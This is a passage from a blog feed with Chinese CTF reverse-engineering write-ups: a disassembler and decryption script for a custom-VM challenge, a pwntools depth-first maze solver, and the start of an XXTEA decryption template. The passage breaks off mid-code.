class="subst">&#123;v6&#125;</span>], <span class="subst">&#123;v5&#125;</span>&#x27;</span>)</span><br><span class="line">        index += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> v21 == <span class="number">0xE</span>:</span><br><span class="line">        <span class="keyword">if</span> v20 == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">f&#x27;_<span class="subst">&#123;index&#125;</span>: add_pint v23[<span class="subst">&#123;v6&#125;</span>], v23[<span class="subst">&#123;v5&#125;</span>]&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> v20 == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">f&#x27;_<span class="subst">&#123;index&#125;</span>: add_pint v23[<span class="subst">&#123;v6&#125;</span>], <span class="subst">&#123;v5&#125;</span>&#x27;</span>)</span><br><span class="line">        index += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> v21 == <span class="number">0x10</span>:</span><br><span class="line">        <span class="keyword">if</span> v20 == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">f&#x27;_<span class="subst">&#123;index&#125;</span>: add_pch v23[<span class="subst">&#123;v6&#125;</span>], v23[<span class="subst">&#123;v5&#125;</span>]&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> v20 == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">f&#x27;_<span class="subst">&#123;index&#125;</span>: add_pch v23[<span class="subst">&#123;v6&#125;</span>], <span class="subst">&#123;v5&#125;</span>&#x27;</span>)</span><br><span class="line">        index += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> v21 == <span class="number">0x12</span>:</span><br><span class="line">        <span class="keyword">if</span> v20 == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">f&#x27;_<span class="subst">&#123;index&#125;</span>: my_xor v23[<span class="subst">&#123;v6&#125;</span>], v23[<span class="subst">&#123;v5&#125;</span>]&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> v20 == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">f&#x27;_<span class="subst">&#123;index&#125;</span>: my_xor v23[<span class="subst">&#123;v6&#125;</span>], <span class="subst">&#123;v5&#125;</span>&#x27;</span>)</span><br><span class="line">        index += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> v21 == <span class="number">0x14</span>:</span><br><span class="line">        <span class="keyword">if</span> v20 == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">f&#x27;_<span class="subst">&#123;index&#125;</span>: mod v23[<span class="subst">&#123;v6&#125;</span>], <span class="subst">&#123;v5&#125;</span>&#x27;</span>)</span><br><span class="line">        index += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> v21 == <span class="number">0x16</span>:</span><br><span class="line">        <span class="keyword">if</span> v20 == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">f&#x27;_<span class="subst">&#123;index&#125;</span>: my_or v23[<span class="subst">&#123;v6&#125;</span>], v23[<span class="subst">&#123;v5&#125;</span>]&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> v20 == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">f&#x27;_<span class="subst">&#123;index&#125;</span>: my_or v23[<span class="subst">&#123;v6&#125;</span>], <span class="subst">&#123;v5&#125;</span>&#x27;</span>)</span><br><span class="line">        index += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> v21 == <span class="number">0x18</span>:</span><br><span class="line">        <span class="keyword">if</span> v20 == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">f&#x27;_<span class="subst">&#123;index&#125;</span>: my_and v23[<span class="subst">&#123;v6&#125;</span>], v23[<span class="subst">&#123;v5&#125;</span>]&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> v20 == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">f&#x27;_<span class="subst">&#123;index&#125;</span>: my_and v23[<span class="subst">&#123;v6&#125;</span>], <span class="subst">&#123;v5&#125;</span>&#x27;</span>)</span><br><span class="line">        index += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> v21 == <span class="number">0x1A</span>:</span><br><span class="line">        <span class="keyword">if</span> v20 == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">f&#x27;_<span class="subst">&#123;index&#125;</span>: push v23[<span class="subst">&#123;v6&#125;</span>], v23[<span class="subst">&#123;v5&#125;</span>]&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> v20 == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">f&#x27;_<span class="subst">&#123;index&#125;</span>: push v23[<span class="subst">&#123;v6&#125;</span>], <span class="subst">&#123;v5&#125;</span>&#x27;</span>)</span><br><span class="line">        index += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> v21 == <span class="number">0x1C</span>:</span><br><span class="line">        <span class="keyword">if</span> v20 == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">f&#x27;_<span class="subst">&#123;index&#125;</span>: pop v23[<span class="subst">&#123;v6&#125;</span>], v23[<span class="subst">&#123;v5&#125;</span>]&#x27;</span>)</span><br><span class="line">        index += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> v21 == <span class="number">0x1E</span>:</span><br><span class="line">        <span class="keyword">if</span> v20 == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">f&#x27;_<span class="subst">&#123;index&#125;</span>: shr v23[<span class="subst">&#123;v6&#125;</span>], v23[<span class="subst">&#123;v5&#125;</span>]&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> v20 == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">f&#x27;_<span class="subst">&#123;index&#125;</span>: shr v23[<span class="subst">&#123;v6&#125;</span>], <span class="subst">&#123;v5&#125;</span>&#x27;</span>)</span><br><span class="line">        index += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> v21 == <span class="number">0x20</span>:</span><br><span class="line">        <span class="keyword">if</span> v20 == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">f&#x27;_<span class="subst">&#123;index&#125;</span>: shl v23[<span class="subst">&#123;v6&#125;</span>], v23[<span class="subst">&#123;v5&#125;</span>]&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> v20 == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">f&#x27;_<span class="subst">&#123;index&#125;</span>: shl v23[<span class="subst">&#123;v6&#125;</span>], <span class="subst">&#123;v5&#125;</span>&#x27;</span>)</span><br><span class="line">        index += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> v21 == <span class="number">0x22</span>:</span><br><span class="line">        <span class="keyword">if</span> v20 == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">f&#x27;_<span class="subst">&#123;index&#125;</span>: ror v23[<span class="subst">&#123;v6&#125;</span>], v23[<span class="subst">&#123;v5&#125;</span>]&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> v20 == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">f&#x27;_<span class="subst">&#123;index&#125;</span>: ror v23[<span class="subst">&#123;v6&#125;</span>], <span class="subst">&#123;v5&#125;</span>&#x27;</span>)</span><br><span class="line">        index += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> v21 == <span class="number">0x24</span>:</span><br><span class="line">        <span class="keyword">if</span> v20 == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">f&#x27;_<span class="subst">&#123;index&#125;</span>: cmpl v23[<span class="subst">&#123;v6&#125;</span>], v23[<span class="subst">&#123;v5&#125;</span>]&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> v20 == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">f&#x27;_<span class="subst">&#123;index&#125;</span>: cmpl v23[<span class="subst">&#123;v6&#125;</span>], <span class="subst">&#123;v5&#125;</span>&#x27;</span>)</span><br><span class="line">        index += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> v21 == <span class="number">0x26</span>:</span><br><span class="line">        <span class="keyword">if</span> v20 == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">f&#x27;_<span class="subst">&#123;index&#125;</span>: cmpeq v23[<span class="subst">&#123;v6&#125;</span>], v23[<span class="subst">&#123;v5&#125;</span>]&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> v20 == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">f&#x27;_<span class="subst">&#123;index&#125;</span>: cmpeq v23[<span class="subst">&#123;v6&#125;</span>], <span class="subst">&#123;v5&#125;</span>&#x27;</span>)</span><br><span class="line">        index += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> v21 == <span class="number">0x28</span>:</span><br><span class="line">        <span class="keyword">if</span> inloop == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">f&#x27;\n_<span class="subst">&#123;index&#125;</span>: start_loop&#x27;</span>)</span><br><span class="line">            inloop = <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> inloop == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">f&#x27;_<span class="subst">&#123;index&#125;</span>: end_loop\n&#x27;</span>)</span><br><span class="line">            inloop = <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> v21 == <span class="number">0x2A</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">f&#x27;_<span class="subst">&#123;index&#125;</span>: judge&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    index += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>转换结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">_0: lea_ch v23[1], v23[11]</span><br><span class="line">_3: my_xor v23[3], v23[3]</span><br><span class="line">_6: my_xor v23[0], v23[0]</span><br><span class="line">_9: my_xor v23[4], v23[4]</span><br><span class="line"></span><br><span class="line">_12: start_loop</span><br><span class="line">_13: add v23[0], 51</span><br><span class="line">_16: mod v23[0], 32</span><br><span class="line">_19: lea_ch v23[9], v23[1]</span><br><span class="line">_22: add_pch v23[9], v23[0]</span><br><span class="line">_25: ldr_ch v23[10], v23[9]</span><br><span class="line">_28: mov v23[4], v23[10]</span><br><span class="line">_31: push v23[5], v23[4]</span><br><span class="line">_34: add v23[3], 1</span><br><span class="line">_37: cmpl v23[3], 32</span><br><span class="line">_40: end_loop</span><br><span class="line"></span><br><span class="line">_41: my_xor v23[0], v23[0]</span><br><span class="line">_44: lea_int v23[8], v23[5]</span><br><span class="line">_47: add_pint v23[8], 224</span><br><span class="line">_50: lea_int v23[2], v23[8]</span><br><span class="line">_53: ldr_int v23[10], v23[2]</span><br><span class="line">_56: mov v23[0], v23[10]</span><br><span class="line">_59: my_and v23[0], 224</span><br><span class="line">_62: shr v23[0], 5</span><br><span class="line">_65: mov v23[4], v23[0]</span><br><span class="line">_68: my_xor v23[3], v23[3]</span><br><span class="line"></span><br><span class="line">_71: start_loop</span><br><span class="line">_72: ldr_int v23[10], v23[2]</span><br><span class="line">_75: mov v23[0], v23[10]</span><br><span class="line">_78: my_and v23[0], 31</span><br><span class="line">_81: shl v23[0], 3</span><br><span class="line">_84: push v23[5], v23[0]</span><br><span class="line">_87: lea_int v23[8], v23[5]</span><br><span class="line">_90: add_pint v23[8], 224</span><br><span class="line">_93: lea_int v23[2], v23[8]</span><br><span class="line">_96: ldr_int v23[10], v23[2]</span><br><span class="line">_99: mov v23[0], v23[10]</span><br><span class="line">_102: my_and v23[0], 224</span><br><span class="line">_105: shr v23[0], 5</span><br><span class="line">_108: pop v23[5], v23[10]</span><br><span class="line">_111: add v23[10], v23[0]</span><br><span class="line">_114: push v23[5], v23[10]</span><br><span class="line">_117: add v23[3], 1</span><br><span class="line">_120: cmpl v23[3], 31</span><br><span class="line">_123: end_loop</span><br><span class="line"></span><br><span class="line">_124: ldr_int v23[10], v23[2]</span><br><span class="line">_127: mov v23[0], v23[10]</span><br><span class="line">_130: my_and v23[0], 31</span><br><span class="line">_133: shl v23[0], 3</span><br><span class="line">_136: add v23[0], v23[4]</span><br><span class="line">_139: push v23[5], v23[0]</span><br><span class="line">_142: my_xor v23[3], v23[3]</span><br><span class="line">_145: mov32 v23[4], v23[13]</span><br><span class="line"></span><br><span class="line">_148: start_loop</span><br><span class="line">_149: lea_int v23[8], v23[5]</span><br><span class="line">_152: add_pint v23[8], 224</span><br><span class="line">_155: lea_int v23[2], v23[8]</span><br><span class="line">_158: ldr_int v23[10], v23[2]</span><br><span class="line">_161: mov v23[0], v23[10]</span><br><span class="line">_164: push v23[5], v23[0]</span><br><span class="line">_167: mov v23[0], v23[4]</span><br><span class="line">_170: add v23[0], v23[3]</span><br><span class="line">_173: pop v23[5], v23[10]</span><br><span class="line">_176: my_xor v23[10], v23[0]</span><br><span class="line">_179: push v23[5], v23[10]</span><br><span class="line">_182: ror v23[4], 8</span><br><span class="line">_185: add v23[3], 1</span><br><span class="line">_188: cmpl v23[3], 32</span><br><span class="line">_191: end_loop</span><br><span class="line"></span><br><span class="line">_192: my_xor v23[3], v23[3]</span><br><span class="line">_195: my_xor v23[4], v23[4]</span><br><span class="line">_198: lea_ch v23[1], v23[12]</span><br><span class="line"></span><br><span class="line">_201: start_loop</span><br><span class="line">_202: lea_ch v23[9], v23[1]</span><br><span class="line">_205: add_pch v23[9], v23[3]</span><br><span class="line">_208: ldr_ch v23[10], v23[9]</span><br><span class="line">_211: mov v23[0], v23[10]</span><br><span class="line">_214: push v23[5], v23[0]</span><br><span class="line">_217: lea_int v23[8], v23[5]</span><br><span class="line">_220: add_pint v23[8], 223</span><br><span class="line">_223: ldr_int v23[10], v23[8]</span><br><span class="line">_226: pop v23[5], v23[0]</span><br><span class="line">_229: push v23[5], v23[0]</span><br><span class="line">_232: cmpeq v23[0], v23[10]</span><br><span class="line">_235: my_or v23[4], v23[7]</span><br><span class="line">_238: add v23[3], 1</span><br><span class="line">_241: cmpl v23[3], 32</span><br><span class="line">_244: end_loop</span><br><span class="line"></span><br><span class="line">_245: judge</span><br></pre></td></tr></table></figure><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>因为是Mach-O文件，不会动调，只能看静态了（成功被指针恶心到了，算法全靠猜）</p><p>第一个循环就是进行了一个顺序上的转换（类似栅栏吧）</p><p>第二个循环看到有先右移5bit，再左移3bit，一开始猜测可能是字节内部转换，后来发现在循环的前也有个右移，循环后也有个左移，代码几乎都一样，猜测是所有字节一起进行位移</p><p>第三个循环注意到有个 <code>ror</code> 的循环右移，然后还有异或，就是每次异或一个字节</p><h2 id="解密-1"><a href="#解密-1" class="headerlink" title="解密"></a>解密</h2><p>最后写一个解密，从文件里dump出密文和key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">cipher = [</span><br><span class="line">    <span class="number">0x75</span>, <span class="number">0x85</span>, <span class="number">0xD1</span>, <span class="number">0x39</span>, <span class="number">0x0B</span>, <span class="number">0x29</span>, <span class="number">0xCD</span>, <span class="number">0x77</span>, <span class="number">0x6D</span>, <span class="number">0x9F</span>, </span><br><span class="line">    <span class="number">0x73</span>, <span class="number">0x23</span>, <span class="number">0x61</span>, <span class="number">0x8B</span>, <span class="number">0x4D</span>, <span class="number">0x45</span>, <span class="number">0x9D</span>, <span class="number">0x8F</span>, <span class="number">0x5B</span>, <span class="number">0x11</span>, </span><br><span class="line">    <span class="number">0xC1</span>, <span class="number">0xC9</span>, <span class="number">0xE5</span>, <span class="number">0xCF</span>, <span class="number">0x45</span>, <span class="number">0xE5</span>, <span class="number">0xB1</span>, <span class="number">0xB3</span>, <span class="number">0x41</span>, <span class="number">0xD9</span>, </span><br><span class="line">    <span class="number">0xCF</span>, <span class="number">0xCF</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">key = [<span class="number">0xDE</span>, <span class="number">0xAD</span>, <span class="number">0xBE</span>, <span class="number">0xEF</span>]</span><br><span class="line"></span><br><span class="line">s = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    cipher[i] ^= key[i % <span class="number">4</span>] + i</span><br><span class="line">    cipher[i] &amp;= <span class="number">0xFF</span></span><br><span class="line">    s &lt;&lt;= <span class="number">8</span></span><br><span class="line">    s += cipher[i]</span><br><span class="line"></span><br><span class="line">s &lt;&lt;= <span class="number">5</span></span><br><span class="line">s += (s &gt;&gt; (<span class="built_in">len</span>(<span class="built_in">bin</span>(s)[<span class="number">2</span>:]) - <span class="number">5</span>))</span><br><span class="line">s &amp;= ((<span class="number">1</span> &lt;&lt; (<span class="number">32</span> * <span class="number">8</span>)) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">i = <span class="number">35</span></span><br><span class="line">flag = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    i += <span class="number">-5</span></span><br><span class="line">    i %= <span class="number">32</span></span><br><span class="line">    <span class="built_in">print</span> (<span class="built_in">chr</span>(n2s(s)[i]), end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> ()</span><br></pre></td></tr></table></figure><p>VM题真是体力活</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;suibianwanwan&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;[FBCTF]go_get_the_flag&lt;/li&gt;
&lt;li&gt;[Zer0pts2020]QR Puzzle&lt;/li&gt;
&lt;li&gt;[XMAN2018排位赛]easyvm&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://s0uthwood.github.io/categories/CTF/"/>
    
    <category term="Reverse" scheme="https://s0uthwood.github.io/categories/CTF/Reverse/"/>
    
    
    <category term="CTF" scheme="https://s0uthwood.github.io/tags/CTF/"/>
    
    <category term="Reverse" scheme="https://s0uthwood.github.io/tags/Reverse/"/>
    
    <category term="BUUOJ" scheme="https://s0uthwood.github.io/tags/BUUOJ/"/>
    
  </entry>
  
  <entry>
    <title>巅峰极客2021 RE</title>
    <link href="https://s0uthwood.github.io/2021/08/04/2021dfjk-re/"/>
    <id>https://s0uthwood.github.io/2021/08/04/2021dfjk-re/</id>
    <published>2021-08-04T05:48:58.000Z</published>
    <updated>2021-08-04T05:56:22.762Z</updated>
    
    <content type="html"><![CDATA[<ul><li>RE1：迷宫</li><li>RE2：so层</li></ul><p>最后一个好像是php？告辞</p><a id="more"></a><h1 id="RE1"><a href="#RE1" class="headerlink" title="RE1"></a>RE1</h1><p>程序逻辑很简单，就是一个迷宫，迷宫的每一个位置写成了一个函数，一开始想手动推一下试试，结果发现有的格子可能有多条路径，然后想反着推，然后发现有相同的问题…</p><p>考虑写自动化脚本，一开始想试试angr，同样有很多问题，想用idaapi又只能现查各种api</p><p>后来在手动执行的时候，发现错误输入和正确输入之间的区别是反馈不同，而且走错路径的话不需要退出，直接原路返回就行，于是考虑直接用pwntools模拟手动执行</p><p>直接简单回溯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">sys.setrecursionlimit(<span class="number">20000</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">success = [</span><br><span class="line">    <span class="string">b&#x27;Just do it\n&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;GOGOGO\n&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;Wuhu~!\n&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;Wuhu\n&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;You are so good\n&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;Nice.\n&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;Yeah~~\n&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;Yeah~~~\n&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;Let\&#x27;s go.\n&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;Never stop\n&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;So smart\n&#x27;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./maze&#x27;</span>)</span><br><span class="line"><span class="comment"># solvepath = &quot;SSSSSSSSSDDDDDDWWWWAAWWAASSSSD&quot;</span></span><br><span class="line"><span class="comment"># context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># solveend = &quot;AASSDDSSSSDDS&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># solvepath = &#x27;S&#x27; * 8</span></span><br><span class="line">solvepath = <span class="string">&#x27;S&#x27;</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">direct = [<span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;S&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;You can only go south.\n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> solvepath:</span><br><span class="line">    p.send(i)</span><br><span class="line">    <span class="built_in">print</span> (p.recvline(), i)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs</span>():</span></span><br><span class="line">    <span class="keyword">global</span> solvepath</span><br><span class="line">    <span class="keyword">for</span> cur <span class="keyword">in</span> direct:</span><br><span class="line">        <span class="keyword">if</span> direct.index(solvepath[<span class="number">-1</span>]) + direct.index(cur) != <span class="number">3</span>:</span><br><span class="line">            p.send(cur)</span><br><span class="line">            rev = p.recvline()</span><br><span class="line">            <span class="comment"># print (rev, cur)</span></span><br><span class="line">            <span class="keyword">if</span> rev <span class="keyword">in</span> success:</span><br><span class="line">                solvepath += cur</span><br><span class="line">                <span class="comment"># print (solvepath)</span></span><br><span class="line">                dfs()</span><br><span class="line">                <span class="comment"># print (direct[3 - direct.index(solvepath[-1])])</span></span><br><span class="line">                p.send(direct[<span class="number">3</span> - direct.index(solvepath[<span class="number">-1</span>])])</span><br><span class="line">                solvepath = solvepath[:<span class="number">-1</span>]</span><br><span class="line">                p.recvline()</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> rev:</span><br><span class="line">                <span class="built_in">print</span> (solvepath + cur)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">dfs()</span><br></pre></td></tr></table></figure><p>运行结果拿去算个md5就行</p><h1 id="RE2"><a href="#RE2" class="headerlink" title="RE2"></a>RE2</h1><p>这题才是传统的逆向啊，为什么做的人反而比第一题少…</p><p>看一下jeb，发现加密在so层，直接ida看so层</p><p>发现先进行了一个RC4，然后是一个XXTEA</p><p>直接解密</p><p>解密代码来自 <a href="https://newbiereer.github.io/">NewBieReer</a> 师傅</p><p>先上XXTEA模板</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DELTA 0x9e3779b9  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MX (((z&gt;&gt;5^y<span class="meta-string">&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))  </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">btea</span><span class="params">(<span class="keyword">uint32_t</span> *v, <span class="keyword">int</span> n, <span class="keyword">uint32_t</span> <span class="keyword">const</span> key[<span class="number">4</span>])</span> </span>&#123; </span><br><span class="line">        <span class="keyword">uint32_t</span> y, z, sum;  </span><br><span class="line">    <span class="keyword">unsigned</span> p, 